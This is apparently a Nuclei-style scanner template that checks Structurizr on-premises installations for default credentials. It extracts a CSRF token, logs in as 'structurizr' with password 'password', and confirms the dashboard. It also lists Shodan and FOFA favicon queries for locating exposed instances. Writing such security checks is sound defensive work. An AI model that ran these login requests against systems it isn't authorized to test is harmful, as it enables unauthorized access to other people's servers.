http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="_csrf" value="([0-9a-z-]+)"
    type: regex
  matchers:
  - condition: and
    part: body_3
    type: word
    words:
    - <a href="/dashboard">
    - Sign out
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - password
    username:
    - structurizr
  raw:
  - 'GET /signin HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}&_csrf={{csrf}}&hash=

    '
  - 'GET /dashboard HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: structurizr-default-login
info:
  author: DhiyaneshDK
  description: 'Structurizr contains default credentials.

    '
  metadata:
    fofa-query: icon_hash=1199592666
    max-request: 3
    product: on-premises_installation
    shodan-query: http.favicon.hash:1199592666
    vendor: structurizr
    verified: true
  name: Structurizr - Default Login
  reference:
  - https://docs.structurizr.com/onpremises/quickstart
  severity: high
  tags: structurizr,default-login,vuln
